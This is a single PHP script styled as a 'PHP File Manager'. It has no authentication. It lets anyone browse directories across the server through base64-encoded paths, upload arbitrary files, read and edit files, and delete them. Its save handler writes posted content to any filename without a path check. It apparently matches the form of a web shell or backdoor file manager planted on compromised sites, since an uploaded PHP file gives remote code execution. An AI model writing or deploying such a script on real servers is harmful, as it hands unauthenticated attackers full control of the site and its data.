<?php
// Helper functions for base64 path encoding
function b64($str) {
    return rtrim(strtr(base64_encode($str), '+/', '-_'), '=');
}
function b64d($str) {
    return base64_decode(strtr($str, '-_', '+/'));
}

// Determine current directory
$cwd = isset($_GET['dir']) ? realpath(b64d($_GET['dir'])) : getcwd();
if (!$cwd || !is_dir($cwd)) {
    die("❌ Invalid directory.");
}
chdir($cwd);

// Handle file deletion
if (isset($_GET['delete'])) {
    $target = realpath(b64d($_GET['delete']));
    if ($target && is_file($target) && strpos($target, $cwd) === 0) {
        if (unlink($target)) {
            echo "<p>🗑️ Deleted: " . htmlspecialchars(basename($target)) . "</p>";
        } else {
            echo "<p>❌ Failed to delete: " . htmlspecialchars(basename($target)) . "</p>";
        }
    } else {
        echo "<p>❌ Invalid file to delete.</p>";
    }
}

// Handle file upload
if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo "<p>✅ Uploaded: " . htmlspecialchars($_FILES['file']['name']) . "</p>";
    } else {
        echo "<p>❌ Upload failed.</p>";
    }
}

// Handle file save
if (isset($_POST['savefile'], $_POST['filename'])) {
    $filename = $_POST['filename'];
    file_put_contents($filename, $_POST['savefile']);
    echo "<p>✅ Saved: " . htmlspecialchars($filename) . "</p>";
}

// Handle file view/edit
if (isset($_GET['edit'])) {
    $filepath = realpath(b64d($_GET['edit']));
    if ($filepath && strpos($filepath, $cwd) === 0 && is_file($filepath)) {
        $contents = file_get_contents($filepath);
        echo "<h3>📝 Editing: " . htmlspecialchars($filepath) . "</h3>";
        echo '<form method="POST">
                <input type="hidden" name="filename" value="' . htmlspecialchars($filepath) . '">
                <textarea name="savefile" rows="25" cols="100">' . htmlspecialchars($contents) . '</textarea><br>
                <input type="submit" value="💾 Save File">
              </form><hr>';
    } else {
        echo "<p>❌ File not found or not accessible.</p><hr>";
    }
}
?>

<h2>📁 PHP File Manager</h2>
<p><strong>Current Directory:</strong> <?php echo htmlspecialchars($cwd); ?></p>

<!-- Upload Form -->
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="📤 Upload File">
</form>

<!-- Directory Listing -->
<ul>
<?php
foreach (scandir($cwd) as $file) {
    if ($file === ".") continue;

    $full = realpath($file);
    if (!$full) continue;

    if (is_dir($full)) {
        echo '<li>📂 <a href="?dir=' . b64($full) . '">' . htmlspecialchars($file) . '</a></li>';
    } else {
        echo '<li>📄 ' . htmlspecialchars($file);
        echo ' [<a href="?dir=' . b64($cwd) . '&edit=' . b64($full) . '">view/edit</a>]';
        echo ' [<a href="?dir=' . b64($cwd) . '&delete=' . b64($full) . '" onclick="return confirm(\'Delete ' . htmlspecialchars($file) . '?\')">🗑️ delete</a>]';
        echo '</li>';
    }
}
?>
</ul>
